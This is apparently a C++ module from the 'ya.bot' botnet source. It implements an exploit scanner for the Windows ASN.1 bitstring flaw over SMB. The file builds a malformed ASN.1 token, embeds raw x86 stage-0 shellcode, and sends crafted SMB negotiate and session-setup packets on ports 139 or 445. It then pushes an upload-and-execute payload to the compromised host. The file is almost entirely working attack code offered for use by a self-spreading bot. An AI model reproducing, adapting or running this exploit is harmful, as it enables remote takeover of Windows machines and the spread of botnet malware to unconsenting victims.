/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANASN1

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by ScriptGod
//botbotbotbotbotbotbotbotbotbotbotbotbot

#include <cmath>
#include <string>

class BitString
{
	public:
		BitString();
		BitString(const char *pszString);
		BitString(void *pData, int nDataLen);
		BitString(void *pPre, int nPreLen, void *pData, int nDataLen);
		void Free();
		bool ASN1();
		bool Bits();
		bool Append(const char *pszString);
		bool Append(void *pData, int nDataLen);
		bool Append(BitString Str);
		bool Constr();
		bool Constr(BitString Str);
		void *m_pData;
		int m_nDataLen;
};

BitString::BitString()
{
		m_nDataLen = 0;
		m_pData	= NULL;
}

BitString::BitString(const char *pszString)
{
	*this = BitString((void*)pszString, strlen(pszString)); 
}

BitString::BitString(void *pData, int nDataLen)
{
	void *pBuffer;
		pBuffer = malloc(nDataLen);
	if (!pBuffer)
			return;
		memset(pBuffer, 0, nDataLen);
		memcpy(pBuffer, pData, nDataLen);
		m_nDataLen = nDataLen;
		m_pData = pBuffer;
}

BitString::BitString(void *pPre, int nPreLen, void *pData, int nDataLen)
{
	void *pBuffer;
		pBuffer = malloc(nPreLen + nDataLen);
	if (!pBuffer)
			return;
		memset(pBuffer, 0, nPreLen + nDataLen);
		memcpy(pBuffer, pPre, nPreLen);
		memcpy(((char*)pBuffer) + nPreLen, pData, nDataLen);
		m_nDataLen = nPreLen + nDataLen;
		m_pData = pBuffer;
}

void BitString::Free()
{
	if (m_pData)
			free(m_pData);
		m_nDataLen = 0;
		m_pData = NULL;
}

bool BitString::ASN1()
{
	int nNumStrLen;
	unsigned char *pNewData;
	if (m_nDataLen >= 0xFFFF)
			return FALSE;
	if (m_nDataLen < 0x7F)
		nNumStrLen = 1;
	else
		nNumStrLen = 3;
		pNewData = (unsigned char *)malloc(m_nDataLen + nNumStrLen);
	if (!pNewData)
			return FALSE;
		memset(pNewData, 0, m_nDataLen + nNumStrLen);
	if (nNumStrLen == 1)
	{
			pNewData[ 0 ] = m_nDataLen;
			memcpy(pNewData + 1, m_pData, m_nDataLen);
	}
	else
	{
			pNewData[0] = 0x82;
			pNewData[1] = m_nDataLen >> 8;
			pNewData[2] = m_nDataLen & 0xFF;
			memcpy(pNewData + 3, m_pData, m_nDataLen);
	}
		free(m_pData);
		m_nDataLen = nNumStrLen + m_nDataLen;
		m_pData = pNewData;
		return TRUE;
}

bool BitString::Bits()
{
	unsigned char *pNewData;
	BitString StrTemp("\x00", 1, m_pData, m_nDataLen);
		StrTemp.ASN1();
		pNewData = (unsigned char *)malloc(StrTemp.m_nDataLen + 1);
	if (!pNewData)
			return FALSE;
		memset(pNewData, 0, StrTemp.m_nDataLen + 1);
		pNewData[0] = '\x03';
		memcpy(pNewData + 1, StrTemp.m_pData, StrTemp.m_nDataLen);
		Free();
		m_nDataLen = StrTemp.m_nDataLen + 1;
		m_pData	= pNewData;
		StrTemp.Free();
		return TRUE;
}

bool BitString::Append(void *pData, int nDataLen)
{
	BitString Temp(m_pData, m_nDataLen, pData, nDataLen);
		Free();
		*this = Temp;
		return TRUE;
}

bool BitString::Append(const char *pszString)
{
		return Append((void*)pszString, strlen(pszString));
}

bool BitString::Append(BitString Str)
{
		return Append(Str.m_pData, Str.m_nDataLen);
}

bool BitString::Constr()
{
	if (!ASN1())
			return FALSE;
	BitString StrTemp2("\x23", 1, m_pData, m_nDataLen);
		Free();
		*this = StrTemp2;
		return TRUE;
}

bool BitString::Constr(BitString Str)
{
	if (!Append(Str))
			return FALSE;
		return Constr();
}

BitString Token(void *pStage0, int nStage0Len, void *pStage1, int nStage1Len)
{
	char bk[] =
			"\xf8\x0f\x01";
	char fw[] =
			"\xf8\x0f\x01\x00";
	char peblock[] =
			"\x20\xf0\xfd\x7f";
	char tag[] =
			"\x90\x42\x90\x42\x90\x42\x90\x42";
	char szRandom[GIABUF];
	BitString Token;
	BitString Temp_Constr_FWBK;
	BitString Temp_Bits_TagStage1;
	BitString Temp_Constr_Unknown;
	BitString Temp_Bits_PEBlockStage0;
	BitString Temp_Constr_PEBlockStage0_Unknown;
	BitString Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1;
	BitString CompleteBitString;
	BitString Temp_Token1;
	BitString Temp_Token2;
	if (nStage0Len > 1032 || sizeof(tag) - 1 + nStage1Len > 1032)
			return Token;
		Temp_Constr_FWBK.Append(fw, sizeof(fw) - 1);
		Temp_Constr_FWBK.Append(bk, sizeof(bk) - 1);
		Temp_Constr_FWBK.Bits();
		Temp_Constr_FWBK.Constr();
		memset(szRandom, 'B', sizeof(szRandom));
		Temp_Bits_TagStage1.Append(tag, sizeof(tag) - 1);	
		Temp_Bits_TagStage1.Append(pStage1, nStage1Len);
		Temp_Bits_TagStage1.Append(szRandom, 1033 - Temp_Bits_TagStage1.m_nDataLen);
		Temp_Bits_TagStage1.Bits();
		Temp_Constr_Unknown.Append("\xEB\x06\x90\x90\x90\x90\x90\x90");
		Temp_Constr_Unknown.Bits();
		memset(szRandom, 'D', sizeof(szRandom));
	BitString Bits_Unknown2(szRandom, 1040);
		Bits_Unknown2.Bits();
		Temp_Constr_Unknown.Constr(Bits_Unknown2);
		Bits_Unknown2.Free();
		memset(szRandom, 'C', sizeof(szRandom));
		Temp_Bits_PEBlockStage0.Append("CCCC");
		Temp_Bits_PEBlockStage0.Append(peblock, sizeof(peblock) - 1);
		Temp_Bits_PEBlockStage0.Append(pStage0, nStage0Len);
		Temp_Bits_PEBlockStage0.Append(szRandom, 1032 - nStage0Len);
		Temp_Bits_PEBlockStage0.Bits();
		Temp_Constr_PEBlockStage0_Unknown.Append(Temp_Bits_PEBlockStage0);
		Temp_Constr_PEBlockStage0_Unknown.Append(Temp_Constr_Unknown);
		Temp_Constr_PEBlockStage0_Unknown.Constr();
		Temp_Bits_PEBlockStage0.Free();
		Temp_Constr_Unknown.Free();
		Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Append(Temp_Bits_TagStage1);
		Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Append(Temp_Constr_FWBK);
		Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Append(Temp_Constr_PEBlockStage0_Unknown);
		Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Constr();
		Temp_Bits_TagStage1.Free();
		Temp_Constr_FWBK.Free();
		Temp_Constr_PEBlockStage0_Unknown.Free();
		memset(szRandom, 'A', sizeof(szRandom));
		CompleteBitString.Append(szRandom, 1024);
		CompleteBitString.Bits();
		CompleteBitString.Append("\x03\x00", 2);
		CompleteBitString.Append(Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1);
		CompleteBitString.Constr();
		Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Free();
		Temp_Token1.Append(CompleteBitString);
		Temp_Token1.ASN1();
		CompleteBitString.Free();
		Temp_Token2.Append("\xA1");
		Temp_Token2.Append(Temp_Token1);
		Temp_Token2.ASN1();
		Temp_Token1.Free();
		Temp_Token1.Append("\x30");
		Temp_Token1.Append(Temp_Token2);
		Temp_Token1.ASN1();
		Temp_Token2.Free();
		Temp_Token2.Append("\x06\x06\x2B\x06\x01\x05\x05\x02\xA0");
		Temp_Token2.Append(Temp_Token1 );
		Temp_Token2.ASN1();
		Temp_Token1.Free();
		Token.Append("\x60");
		Token.Append(Temp_Token2);
		Temp_Token2.Free();
		return Token;
}

int asn1_recvsmb(SOCKET sock, char *pszBuffer, int nLength, int nFlags)
{
	fd_set fdset_read, fdset_write;
	TIMEVAL timeout;
		FD_ZERO(&fdset_read);
		FD_ZERO(&fdset_write);
		FD_SET(sock, &fdset_read);
		FD_SET(sock, &fdset_write);
		timeout.tv_sec = 10;
		timeout.tv_usec	= 0;
	if (select(sock + 1, &fdset_read, NULL, &fdset_write, &timeout) == SOCKET_ERROR)
			return FALSE;
	if (!FD_ISSET(sock, &fdset_read))
			return FALSE;
		return recv(sock, pszBuffer, nLength, nFlags);
}

bool asn1_sendsmb(SOCKET sock, void *pBuffer, int nLength)
{
	DWORD dwNetNum;
		dwNetNum = htonl(nLength);
	if (send(sock, (char *)&dwNetNum, sizeof(dwNetNum), 0) != sizeof(dwNetNum))
			return FALSE;
		return (send(sock, (char *)pBuffer, nLength, 0) == nLength);
}

bool expscan_asn1(SExpScanInfo s_esi)
{
	char smb_request[] =
			"\x81\x00\x00\x44\x20\x43\x4B\x46\x44\x45\x4E\x45\x43\x46\x44\x45"
			"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"
			"\x41\x43\x41\x43\x41\x00\x20\x43\x41\x43\x41\x43\x41\x43\x41\x43"
			"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
			"\x41\x43\x41\x43\x41\x41\x41\x00";
	char smb_negotiate[] =
			"\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x37\x13\x00\x00\x00\x00"
			"\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50"
			"\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02\x4C\x41\x4E\x4D"
			"\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F\x77\x73\x20\x66"
			"\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70\x73\x20\x33\x2E"
			"\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00\x02\x4C"
			"\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54\x20\x4C\x4D\x20"
			"\x30\x2E\x31\x32\x00";
	char smb_session1[] =
			"\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x37\x13\x00\x00\x00\x00"
			"\x0C\xFF\x00\x00\x00\x04\x11\x0A\x00\x00\x00\x00\x00\x00\00";
	char smb_session2[] = 
			"\x00\x00\x00\x00\xD4\x00\x00\x80";
	char smb_session3[] = 
			"\x00\x00\x00\x00\x00\x00";
	char shellcode_stage0[] =
			"\x53\x56\x57\x66\x81\xEC\x80\x00\x89\xE6\xE8\xED\x00\x00\x00\xFF"
			"\x36\x68\x09\x12\xD6\x63\xE8\xF7\x00\x00\x00\x89\x46\x08\xE8\xA2"
			"\x00\x00\x00\xFF\x76\x04\x68\x6B\xD0\x2B\xCA\xE8\xE2\x00\x00\x00"
			"\x89\x46\x0C\xE8\x3F\x00\x00\x00\xFF\x76\x04\x68\xFA\x97\x02\x4C"
			"\xE8\xCD\x00\x00\x00\x31\xDB\x68\x10\x04\x00\x00\x53\xFF\xD0\x89"
			"\xC3\x56\x8B\x76\x10\x89\xC7\xB9\x10\x04\x00\x00\xF3\xA4\x5E\x31"
			"\xC0\x50\x50\x50\x53\x50\x50\xFF\x56\x0C\x8B\x46\x08\x66\x81\xC4"
			"\x80\x00\x5F\x5E\x5B\xFF\xE0\x60\xE8\x23\x00\x00\x00\x8B\x44\x24"
			"\x0C\x8D\x58\x7C\x83\x43\x3C\x05\x81\x43\x28\x00\x10\x00\x00\x81"
			"\x63\x28\x00\xF0\xFF\xFF\x8B\x04\x24\x83\xC4\x14\x50\x31\xC0\xC3"
			"\x31\xD2\x64\xFF\x32\x64\x89\x22\x31\xDB\xB8\x90\x42\x90\x42\x31"
			"\xC9\xB1\x02\x89\xDF\xF3\xAF\x74\x03\x43\xEB\xF3\x89\x7E\x10\x64"
			"\x8F\x02\x58\x61\xC3\x60\xBF\x20\xF0\xFD\x7F\x8B\x1F\x8B\x46\x08"
			"\x89\x07\x8B\x7F\xF8\x81\xC7\x78\x01\x00\x00\x89\xF9\x39\x19\x74"
			"\x04\x8B\x09\xEB\xF8\x89\xFA\x39\x5A\x04\x74\x05\x8B\x52\x04\xEB"
			"\xF6\x89\x11\x89\x4A\x04\xC6\x43\xFD\x01\x61\xC3\xA1\x0C\xF0\xFD"
			"\x7F\x8B\x40\x1C\x8B\x58\x08\x89\x1E\x8B\x00\x8B\x40\x08\x89\x46"
			"\x04\xC3\x60\x8B\x6C\x24\x28\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA"
			"\x8B\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x38\x49\x8B\x34\x8B\x01\xEE"
			"\x31\xFF\x31\xC0\xFC\xAC\x38\xE0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB"
			"\xF4\x3B\x7C\x24\x24\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B"
			"\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24\x1C\x61\xC2"
			"\x08\x00\xEB\xFE";
	BitString BitToken;
	char *pszPacket, szRecvBuffer[MEDBUF], szShellCode[BIGBUF];
	int nPos = 0, nShellcodeSize, nSize, nTargetOS = OS_UNKNOWN;

#ifndef NO_DEBUG
		debug_print("Exploit scanning ASN1, expscan_asn1()");
#endif

	if (s_esi.m_nPort != 445)
	{
			nTargetOS = fphost(s_esi.m_szIP, s_esi.m_nPort);
		if ((nTargetOS == OS_UNKNOWN) ||
				(nTargetOS == OS_WINNT) ||
				(nTargetOS == OS_WIN2003) ||
				(nTargetOS == OS_WINVISTA)) return FALSE;
	}
	if (s_esi.m_csock == INVALID_SOCKET)
			return FALSE;
	if (s_esi.m_nPort == 139)
	{
		if (send(s_esi.m_csock, smb_request, sizeof(smb_request) - 1, 0) == SOCKET_ERROR)
				return FALSE;
		if (asn1_recvsmb(s_esi.m_csock,
					szRecvBuffer,
					sizeof(szRecvBuffer) - 1,
					0) == SOCKET_ERROR) return FALSE;
	}
		memcpy(szShellCode, shellcode_uploadexecute, sizeof(shellcode_uploadexecute) - 1);
		nShellcodeSize = sizeof(shellcode_uploadexecute) - 1;
		BitToken = Token(shellcode_stage0,
				sizeof(shellcode_stage0) - 1,
				szShellCode,
				nShellcodeSize);
	if (!BitToken.m_nDataLen)
			return FALSE;
		nSize = sizeof(smb_session1) - 1 + 2 +
				sizeof(smb_session2) - 1 + 2 +
				BitToken.m_nDataLen +
				sizeof(smb_session3) - 1;
		pszPacket = (char *)malloc(nSize);
	if (!pszPacket)
			return FALSE;
		memset(pszPacket, 0, nSize);
		memcpy(pszPacket, smb_session1, sizeof(smb_session1) - 1);
		nPos += sizeof(smb_session1) - 1;
		*(short*)(&pszPacket[nPos]) = BitToken.m_nDataLen;
		nPos += 2;
		memcpy(pszPacket + nPos, smb_session2, sizeof(smb_session2) - 1);
		nPos += sizeof(smb_session2 ) - 1;
		*(short*)(&pszPacket[nPos]) = BitToken.m_nDataLen;
		nPos += 2;
		memcpy(pszPacket + nPos, BitToken.m_pData, BitToken.m_nDataLen);
		nPos += BitToken.m_nDataLen;
		memcpy(pszPacket + nPos, smb_session3, sizeof(smb_session3) - 1);
		nPos += sizeof(smb_session3) - 1;
	if (!asn1_sendsmb(s_esi.m_csock, smb_negotiate, sizeof(smb_negotiate) - 1))
	{
			free(pszPacket);
			return FALSE;
	}
	if (asn1_recvsmb(s_esi.m_csock, szRecvBuffer, sizeof(szRecvBuffer) - 1, 0) == SOCKET_ERROR)
	{
			free(pszPacket);
			return FALSE;
	}
	if (!asn1_sendsmb(s_esi.m_csock, pszPacket, nSize))
	{
			free(pszPacket);
			return FALSE;
	}
	if (asn1_recvsmb(s_esi.m_csock, szRecvBuffer, sizeof(szRecvBuffer) - 1, 0) == SOCKET_ERROR)
	{
			free(pszPacket);
			return FALSE;
	}
		free(pszPacket);
		BitToken.Free();
	if (!transfer_directtransfer(s_esi.m_szIP,
				SHELLCODE_UPLOADPORT,
				s_esi.m_szExploitName,
				s_esi.m_bsock,
				s_esi.m_szResultChannel,
				s_esi.m_bSilent,
				s_esi.m_bVerbose)) return FALSE;
		return TRUE;
}
#endif
#endif